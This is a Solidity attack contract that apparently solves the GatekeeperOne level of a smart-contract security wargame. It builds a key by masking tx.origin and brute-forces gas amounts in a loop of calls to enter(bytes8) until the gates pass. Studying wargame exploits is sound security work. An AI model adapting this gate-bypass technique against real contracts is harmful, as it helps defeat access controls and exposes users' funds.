pragma solidity 0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import "../GateKeeperOne.sol";

  contract GateKeeperATK{
    using SafeMath for uint256;
    bytes8 public mask = 0xFF000FFF0000FFFF;
    address public instance;

    constructor(address _instance) public {
      instance = _instance;
    }
    function atk() external {
        bytes8 key = bytes8(uint64(tx.origin));
        key = key & mask;
        for (uint256 i = 0; i < 8191; i++){
            (bool success,) = instance.call.gas(24000+ i)(
                abi.encodeWithSignature(("enter(bytes8)"), key)
            );
            if(success){
                break; 
            }
          }
        }
      }